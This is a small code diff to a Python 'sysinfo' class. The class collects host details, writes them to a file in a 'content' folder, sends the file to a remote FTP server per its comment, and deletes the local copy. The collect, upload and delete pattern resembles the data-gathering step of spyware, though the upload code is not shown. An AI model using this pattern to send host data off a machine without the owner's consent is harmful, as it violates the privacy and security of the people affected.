@@ -5,7 +5,11 @@ import psutil
 import socket
 import uuid
 import platform
+import os
 
+FOLDER_NAME = "content"
+FILE_NAME = "sysinfo.txt"
+FILE_PATH = os.path.join(FOLDER_NAME, FILE_NAME)
 
 class sysinfo():
     def __init__(self):
@@ -53,15 +57,18 @@ class sysinfo():
         return info
     
     def write(self):
+        if not os.path.exists(FOLDER_NAME):
+            os.makedirs(FOLDER_NAME)
+
         #Create file and write system info to this file
-        with open("sysinfo.txt", 'w') as f:
+        with open(FILE_PATH, 'w') as f:
             f.write(self.getInfo())
 
     def remove(self):
-        removefile("sysinfo.txt")
+        removefile(FILE_PATH)
 
 
     def send(self):
         #Send this file to the remote FTP server
-        send_file('sysinfo.txt')
+        send_file(FILE_PATH)
 
